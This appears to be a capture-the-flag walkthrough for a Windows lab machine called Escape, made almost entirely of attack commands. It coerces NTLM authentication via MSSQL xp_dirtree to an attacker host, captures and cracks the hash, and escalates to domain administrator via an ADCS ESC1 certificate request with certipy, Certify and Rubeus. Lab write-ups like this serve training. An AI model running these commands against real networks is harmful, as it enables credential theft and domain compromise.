# Escape - MSSQL xp_dirtree / ADCA ESC1

## MSSQL - 1433 port

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.11.202
```

## impacket-mssqlclient

```bash
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

### UNC Path Injection (xp_dirtree)

```bash
# On MSSQL Server
xp_dirtree //10.10.14.10/doesnotexists
# OR
exec master.sys.xp_dirtree '\\10.10.14.10\doesnotexists',1,1

# On kali Linux
sudo responder -I tun0
# you should get a hash on your responder
```

### Hash crack & sql_svc

```bash
hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt
# Result: REGGIE1234ronnie
```

### Read sql log file & see Ryan.Cooper creds

```bash
C:\SQLServer\Logs> type ERRORLOG.BAK
```

[image]

## ADCA ESC1 attack

Reference: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc1

### Linux

**Enumeration:**

```bash
certipy-ad find -u 'ryan.cooper' -p 'NuclearMosquito3' -target dc.sequel.htb -vulnerable -stdout
```

**Performing attack:**

```bash
# See SID
get-addomain | fl DomainSID
```

```bash
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target dc.sequel.htb -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn administrator@sequel.htb -sid S-1-5-21-4078382237-1492182817-2568127209
```

```bash
certipy-ad auth -pfx administrator.pfx -u administrator -domain sequel.htb -dc-ip 10.10.11.202
```

### Windows

**Enumeration:**

```bash
.\Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
```

**Performing the attack:**

Request a certificate for the vulnerable template and specify a SAN for the target user:

```bash
.\Certify.exe request /ca:sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:sequel\administrator /sid:S-1-5-21-4078382237-1492182817-2568127209
```

Use the certificate with Rubeus to request NTLM hash or TGT:

```bash
.\Rubeus.exe asktgt /user:sequel.htb\administrator /certificate:cert.pfx /getcredentials
```
